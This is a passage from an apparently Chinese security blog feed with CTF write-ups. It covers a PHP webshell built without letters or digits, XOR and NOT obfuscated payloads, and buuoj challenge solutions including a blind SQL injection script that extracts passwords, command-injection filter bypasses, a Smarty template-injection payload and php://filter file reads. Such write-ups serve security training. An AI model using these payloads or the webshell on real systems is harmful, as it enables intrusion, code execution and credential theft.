所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。<br>数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。<br>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;[];</span><br><span class="line">$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;</span><br><span class="line">echo $_[0].$_[3];</span><br><span class="line">&#x2F;&#x2F; 输出Aa</span><br></pre></td></tr></table></figure><p>再加上我们不适用数字构造出的数字，写出下面这个webshell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$_&#x3D;[];</span><br><span class="line">$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;</span><br><span class="line">$_&#x3D;$_[(&#39;(&#39;&#x3D;&#x3D;&#39;&#x3D;&#39;)]; &#x2F;&#x2F; $_&#x3D;$_[0];$_&#x3D;A;</span><br><span class="line">$___&#x3D;$_; &#x2F;&#x2F; A</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; E</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; R</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; T</span><br><span class="line">$____&#x3D;&#39;_&#39;;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$____;</span><br><span class="line">@$___($_[_]);</span><br></pre></td></tr></table></figure><p>执行成功：<br><img src="/images/20200724000716.png" alt=""></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>在上面那道题中有一个payload是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p>这里利用了php7中执行动态函数的方法，在php5中是执行不成功的，我们来拆解分析一下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%ff ^ %160 &#x3D; _</span><br><span class="line">%ff ^ %184 &#x3D; G</span><br><span class="line">%ff ^ %186 &#x3D; E</span><br><span class="line">%ff ^ %171 &#x3D; T</span><br><span class="line">%ff%ff%ff%ff^%a0%b8%ba%ab &#x3D; _GET</span><br><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125; &#x3D; $_GET</span><br><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125; &#x3D; $_GET&#123;%ff&#125;</span><br><span class="line">phpinfo()</span><br></pre></td></tr></table></figure><p>这里放出一个fuzz脚本，帮助快速找到异或的字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; &#39;&#39;;</span><br><span class="line">$argv &#x3D; str_split(&#39;_GET&#39;);</span><br><span class="line"></span><br><span class="line">for ($i&#x3D;0; $i &lt; count($argv); $i++) &#123; </span><br><span class="line">for ($j&#x3D;0; $j &lt; 255; $j++) &#123; </span><br><span class="line">$k &#x3D; chr($j)^chr(255);  &#x2F;&#x2F;dechex(255)&#x3D;0xff</span><br><span class="line">if($k &#x3D;&#x3D; $argv[$i])&#123;</span><br><span class="line">echo &quot;%ff ^ %&quot;.$j.&quot; &#x3D; &quot;.$k.&quot;&lt;br&gt;&quot;;</span><br><span class="line">$payload .&#x3D; &#39;%&#39;.dechex($j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $payload;</span><br></pre></td></tr></table></figure><p><img src="/images/20200723223428.png" alt=""></p><p>还有一个payload是这样的，这个是取反：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p>还有这个payload，也是取反:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p>这个是<code>~</code>在{}中执行了取反操作，所以${~”\xa0\xb8\xba\xab”}取反相当于$_GET。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近碰到一道题，便学习了一下相关无字母数字构造webshell的知识。题目如下：&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>buuoj 刷题记录（二）</title>
    <link href="http://yoursite.com/2020/07/20/buuoj-02/"/>
    <id>http://yoursite.com/2020/07/20/buuoj-02/</id>
    <published>2020-07-20T13:10:26.000Z</published>
    <updated>2020-07-24T11:48:50.586Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><blockquote><p>考点：盲注，文件上传<br>查看robots.txt：</p></blockquote><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure><p>抓包过程发现<strong>user.php</strong>和<strong>image.php</strong>，于是下载源码，查看image.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">$id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;</span><br><span class="line">$path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$id&#x3D;addslashes($id);</span><br><span class="line">$path&#x3D;addslashes($path);</span><br><span class="line"></span><br><span class="line">$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);</span><br><span class="line">$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);</span><br><span class="line"></span><br><span class="line">$result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;);</span><br><span class="line">$row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;];</span><br><span class="line">header(&quot;Content-Type: image&#x2F;jpeg&quot;);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>GET请求id和path参数时首先经过<strong>addslashes()</strong>函数转义，在<strong>单引号，双引号，反斜杠和NULL</strong>前面加上反斜杠“\”,<br>然后再经过<strong>str_replace()</strong>函数把<code>&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;</code>中的任意一个替换为空，<br>下面的select语句构造sql注入，传入的值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;\0&amp;path&#x3D; or 1&#x3D;1%23</span><br></pre></td></tr></table></figure><p>经过addslashes()处理之后select语句就变成了</p><figure class="highlight plain"><figcaption><span>* from images where id</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">再经过str_replace()函数处理之后变成了</span><br><span class="line">&#96;&#96;&#96;select * from images where id&#x3D;&#39;\&#39; or path&#x3D;&#39; or 1&#x3D;1%23&#39;&quot;);</span><br></pre></td></tr></table></figure><p>构造成功，盲注python脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;a9d9fc32-9b43-4a17-8c8b-d137102a6211.node3.buuoj.cn&#x2F;image.php&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(32,128):</span><br><span class="line">        # payload &#x3D; &#39;?id&#x3D;%5C0%27&amp;path&#x3D;%20or%20if(ascii(mid(database(),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)%23&#39;.format(i,j)</span><br><span class="line">        # 数据库： ciscnfinal</span><br><span class="line">        # payload &#x3D; &quot;?id&#x3D;%5C0%27&amp;path&#x3D;%20or%20if(ascii(mid((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;0x636973636e66696e616c),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)%23&quot;.format(i,j)</span><br><span class="line">        # 表名： images,users</span><br><span class="line">        #payload &#x3D; &quot;?id&#x3D;%5C0%27&amp;path&#x3D;%20or%20if(ascii(mid((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;0x7573657273),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)%23&quot;.format(i,j)</span><br><span class="line">        # users列名： username,password</span><br><span class="line">        payload &#x3D; &quot;?id&#x3D;%5C0&amp;path&#x3D;%20or%20if(ascii(mid((select%20group_concat(password)%20from%20users),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)%23&quot;.format(i,j)</span><br><span class="line">        # passwor: b5fef2a49e1cee3ee711</span><br><span class="line">        r &#x3D; requests.get(url+payload)</span><br><span class="line">        #print(url + path)</span><br><span class="line">        if len(r.text)&gt;10000:</span><br><span class="line">            flag +&#x3D; chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">    if(j&#x3D;&#x3D;127):</span><br><span class="line">        break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到账号和密码登陆，是一个上传界面<br>上传文件之后把上传日志记录到一个php文件，而没有给出文件路径，考虑文件名注入一句话，php被过滤，选择<code>&lt;?= ?&gt;</code>标签，即可，flag在根目录。</p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>f12一键获取flag。</p><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><blockquote><p>考点：php弱类型，命令注入<br>查看源码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;level 1</span><br><span class="line">if (isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    $num &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;level 2</span><br><span class="line">if (isset($_GET[&#39;md5&#39;]))&#123;</span><br><span class="line">   $md5&#x3D;$_GET[&#39;md5&#39;];</span><br><span class="line">   if ($md5&#x3D;&#x3D;md5($md5))</span><br><span class="line">       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;get flag</span><br><span class="line">if (isset($_GET[&#39;get_flag&#39;]))&#123;</span><br><span class="line">    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>一共有三层，第一层利用php弱类型，即可绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intval(&#39;2e4&#39;)&#x3D;2</span><br><span class="line">intval(&#39;2e4&#39;+1)&#x3D;20001</span><br></pre></td></tr></table></figure><p>第二层也是弱类型，找到一个0e开头的字符串，其md5值也是0e开头的字符串即可绕过，写个脚本跑一下就出来了。<br>第三层是执行命令，不能有空格和cat，空格用<code>$IFS$9</code>替换，cat用tac替换，然后读取flag。</p><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><blockquote><p>考点：ssti模板注入</p></blockquote><p>打开页面发现页面会记录IP地址，第一时间想到存在XFF头注入，又看到提示Smarty,是模板注入了，抓包然后测试：<br><img src="/images/20200724011948.png" alt=""><br>当输入{1+1}的时候，显示2。看了看别人的writeup，<br>smarty中的{if}标签中可以执行php语句，得flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/20200724012403.png" alt=""></p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><blockquote><p>考点：文件包含</p></blockquote><p>进入页面两个按钮，随便点一个，出来一张图片，发现url变成了这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e7a037d7-b95d-419a-ae85-6f3acf5e0ea5.node3.buuoj.cn&#x2F;index.php?category&#x3D;woofers</span><br></pre></td></tr></table></figure><p>把woofers改为index发现不行，然后改为<code>index woofer</code>出现报错信息：<br><img src="/images/20200724012928.png" alt=""><br>可以发现include语句是这样的，获取url中的category参数然后拼接<code>.php</code>，然后包含这个php文件，尝试用伪协议读取文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index</span><br></pre></td></tr></table></figure><p>base64解码得到index.php源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;category&#39;];</span><br><span class="line"></span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">include ($file . &#39;.php&#39;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>参数中必须包含<code>index,woofers,meowers</code>中的一个，然后这样刚好读到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>这道题真坑啊，进页面是几个输入框，各种提交，查询，修改，删除的功能，然后我在查询那里试了半天，试出一个异或注入，爆出数据库名后，没想到查表得时候发现select什么的都给ban了，也没法绕过，结果没办法，只能找其他方法了。</p><p>在主页有一个文件包含，用伪协议读取到所有文件的源码，源码就不一一放出来了，看两个比较重要的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;confirm.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line">&#x2F;&#x2F;var_dump($_POST);</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address &#x3D; $_POST[&quot;address&quot;];</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if($fetch-&gt;num_rows&gt;0) &#123;</span><br><span class="line">        $msg &#x3D; $user_name.&quot;已提交订单&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;insert into &#96;user&#96; ( &#96;user_name&#96;, &#96;address&#96;, &#96;phone&#96;) values( ?, ?, ?)&quot;;</span><br><span class="line">        $re &#x3D; $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);</span><br><span class="line">        $re &#x3D; $re-&gt;execute();</span><br><span class="line">        if(!$re) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;订单提交成功&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从上面可以看到，对传入的<code>user_name</code>和<code>phone</code>进行了严格的过滤，但是对```address``却没有做过滤，再看看另一个文件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;change.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address &#x3D; addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];</span><br><span class="line">        $result &#x3D; $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;订单修改成功&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg 